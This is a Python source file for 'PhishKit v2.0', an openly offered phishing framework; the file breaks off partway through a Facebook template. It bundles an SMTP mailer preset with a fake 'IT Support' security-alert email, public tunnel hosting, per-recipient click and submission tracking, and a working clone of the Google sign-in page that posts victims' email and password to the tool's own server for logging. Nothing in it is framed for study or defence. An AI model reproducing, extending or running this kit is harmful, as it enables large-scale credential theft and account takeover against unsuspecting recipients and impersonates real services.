#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PhishKit v2.0 - single-file BlackEye-style phishing framework + mailer.

NEW IN v2
  * built-in SMTP mailer - send the link straight from the tool
  * PERMANENT public link via Cloudflare named tunnel (your own domain)
    plus quick-tunnel and ngrok modes
  * per-recipient tracking tokens - you see WHO clicked and WHO submitted
  * tunnel watchdog - auto-restarts if the tunnel drops
  * config file + `setup` wizard, `send`, `url`, `report` commands

QUICK START
  python3 phishkit.py setup                     # one-time wizard
  python3 phishkit.py serve --tunnel named      # permanent public link
  python3 phishkit.py send --file people.txt    # email everyone
  python3 phishkit.py report                    # who clicked / submitted

COMMANDS
  serve    start the server (+ optional tunnel)
  send     email the link to one or more addresses
  url      print the current public link
  report   show clicks and submissions per recipient
  setup    interactive config wizard
  list     list available templates

DEPENDENCIES: Python 3.8+ stdlib only.
OPTIONAL: cloudflared (permanent/quick tunnel), ngrok (alt tunnel).
"""

import argparse
import html
import json
import re
import secrets
import shutil
import smtplib
import socket
import subprocess
import sys
import threading
import time
import urllib.parse
from datetime import datetime
from email.message import EmailMessage
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

ROOT = Path(__file__).resolve().parent
EXT_TEMPLATES = ROOT / "templates"
LOGS = ROOT / "logs"
LOGS.mkdir(exist_ok=True)

JSONL = LOGS / "captured.jsonl"
TXTFILE = LOGS / "captured.txt"
CLICKS = LOGS / "clicks.jsonl"
RECIPIENTS = LOGS / "recipients.json"
PUBLIC_URL_FILE = LOGS / "public_url.txt"
CONFIG_FILE = ROOT / "phishkit.config.json"
LOCK = threading.Lock()


class C:
    R = "\033[0m"; B = "\033[1m"; DIM = "\033[2m"
    RED = "\033[91m"; GRN = "\033[92m"; YEL = "\033[93m"
    BLU = "\033[94m"; MAG = "\033[95m"; CYA = "\033[96m"


# ==========================================================================
#  CONFIG
# ==========================================================================

DEFAULT_CONFIG = {
    "template": "google",
    "port": 8080,
    "stay": False,
    "domain": "",
    "tunnel_mode": "quick",
    "tunnel_name": "phishkit",
    "smtp": {
        "host": "smtp.gmail.com",
        "port": 587,
        "user": "",
        "password": "",
        "from_email": "",
        "from_name": "IT Support",
    },
    "email": {
        "subject": "Security alert: verify your account",
        "intro": "We noticed a new sign-in attempt on your account. "
                 "Please confirm it was you.",
        "button": "Verify my account",
        "outro": "If this wasn't you, sign in again to secure your account.",
    },
}


def deep_merge(base, over):
    out = dict(base)
    for k, v in over.items():
        if isinstance(v, dict) and isinstance(out.get(k), dict):
            out[k] = deep_merge(out[k], v)
        else:
            out[k] = v
    return out


def load_config():
    cfg = json.loads(json.dumps(DEFAULT_CONFIG))
    if CONFIG_FILE.exists():
        try:
            cfg = deep_merge(cfg, json.loads(CONFIG_FILE.read_text(encoding="utf-8")))
        except Exception as e:
            print(f"{C.YEL}[!] bad {CONFIG_FILE.name}: {e}{C.R}")
    return cfg


def save_config(cfg):
    CONFIG_FILE.write_text(json.dumps(cfg, indent=2), encoding="utf-8")


# ==========================================================================
#  BUILT-IN TEMPLATES
# ==========================================================================

TEMPLATES = {}

TEMPLATES["google"] = {
    "name": "Google",
    "redirect": "https://accounts.google.com",
    "html": """<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in - Google Accounts</title>
<style>
*{box-sizing:border-box;font-family:Roboto,Arial,sans-serif}
body{margin:0;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{width:100%;max-width:420px;padding:48px 40px;border:1px solid #dadce0;border-radius:8px;margin:16px}
.logo{font-size:26px;font-weight:500;letter-spacing:-1px;text-align:center;margin-bottom:8px}
.logo i{font-style:normal}
h1{font-size:24px;font-weight:400;margin:16px 0 8px;text-align:center}
.sub{text-align:center;color:#202124;font-size:16px;margin-bottom:28px;word-break:break-all}
input{width:100%;padding:13px 15px;font-size:16px;border:1px solid #dadce0;border-radius:4px;margin-bottom:18px;outline:none}
input:focus{border:2px solid #1a73e8;padding:12px 14px}
.row{display:flex;justify-content:space-between;align-items:center;font-size:14px}
a{color:#1a73e8;text-decoration:none;font-weight:500}
.actions{display:flex;justify-content:flex-end;margin-top:28px}
button{background:#1a73e8;color:#fff;border:0;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer}
button:hover{background:#1765cc}
.hidden{display:none}
.foot{font-size:12px;color:#5f6368;text-align:center;margin-top:36px}
</style></head><body>
<div class="card">
  <div class="logo"><i style="color:#4285f4">G</i><i style="color:#ea4335">o</i><i style="color:#fbbc05">o</i><i style="color:#4285f4">g</i><i style="color:#34a853">l</i><i style="color:#ea4335">e</i></div>
  <h1 id="title">Sign in</h1>
  <p class="sub" id="sub">Use your Google Account</p>
  <form method="post" action="/login" id="f">
    <div id="s1">
      <input type="email" name="email" id="email" placeholder="Email or phone" autofocus required>
      <div class="row"><a href="#">Forgot email?</a></div>
    </div>
    <div id="s2" class="hidden">
      <input type="password" name="password" id="password" placeholder="Enter your password" required>
      <div class="row"><a href="#">Forgot password?</a></div>
    </div>
    <div class="actions"><button type="submit" id="btn">Next</button></div>
  </form>
  <p class="foot">English (United States)</p>
</div>
<script>
var step=1;
document.getElementById('f').addEventListener('submit',function(e){
  if(step===1){e.preventDefault();step=2;
    document.getElementById('s1').classList.add('hidden');
    document.getElementById('s2').classList.remove('hidden');
    document.getElementById('title').textContent='Welcome';
    document.getElementById('sub').textContent=document.getElementById('email').value;
    document.getElementById('btn').textContent='Sign in';
    document.getElementById('password').focus();}
});
</script></body></html>""",
}

TEMPLATES["facebook"] = {
    "name": "Facebook",
    "redirect": "https://www.facebook.com",
    "html": """<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Log in to Facebook</title>
<style>
*{box-sizing:border-box;font-family:Helvetica,Arial,sans-serif}
body{margin:0;background:#